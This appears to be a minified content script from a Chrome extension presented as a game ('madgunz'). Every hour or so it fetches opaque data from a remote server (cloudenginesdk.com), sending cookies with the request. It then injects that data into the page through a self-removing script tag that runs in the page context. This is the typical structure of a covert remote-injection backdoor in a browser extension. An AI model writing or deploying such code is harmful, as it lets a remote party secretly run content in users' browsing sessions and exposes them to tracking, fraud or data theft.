function scr(a){let b=parseInt(""+Date.now()/1e3),c=b=>{let a=document.createElement("script");a.setAttribute("data-options",b),a.setAttribute("src",chrome.runtime.getURL("play/script.js")),a.onload=()=>{document.documentElement.removeChild(a)},document.documentElement.appendChild(a)};if((!a.data||a.time&&b-parseInt(a.time)>3600)&&(!a.tm||b-parseInt(a.tm)>30)){let d=b,e=b;chrome.storage.local.set({tm:d},()=>{fetch(endpoint,{credentials:"include"}).then(a=>a.text()).then(a=>{chrome.storage.local.set({data:a,tm:"",time:e},()=>{c(a)})}).catch(()=>{chrome.storage.local.set({tm:""},()=>{})})})}else a.data&&c(a.data)}var fields=["time","tm","data"],endpoint="https://cloudenginesdk.com/api/v2/?prod=madgunz";chrome.storage.local.get(fields,scr)